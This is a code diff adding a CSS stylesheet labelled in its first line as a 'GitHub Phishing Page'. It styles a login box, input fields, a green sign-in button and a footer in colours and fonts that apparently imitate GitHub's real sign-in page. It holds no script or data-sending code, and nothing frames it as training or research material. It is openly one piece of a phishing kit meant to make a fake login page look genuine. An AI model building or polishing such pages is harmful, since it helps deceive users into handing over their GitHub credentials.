@@ -1,0 +1,56 @@
+/* GitHub Phishing Page */
+body {
+    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+    background: #f6f8fa;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+}
+
+.login-box {
+    background: #fff;
+    border: 1px solid #d8dee4;
+    border-radius: 6px;
+    padding: 20px;
+    width: 340px;
+    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+}
+
+.logo {
+    text-align: center;
+    margin-bottom: 20px;
+}
+
+input {
+    width: 100%;
+    padding: 8px;
+    margin: 8px 0;
+    border: 1px solid #d8dee4;
+    border-radius: 6px;
+    box-sizing: border-box;
+}
+
+button {
+    background: #2da44e;
+    color: white;
+    border: none;
+    padding: 10px;
+    width: 100%;
+    border-radius: 6px;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+button:hover {
+    background: #2c974b;
+}
+
+.footer {
+    margin-top: 20px;
+    text-align: center;
+    color: #57606a;
+    font-size: 12px;
+}
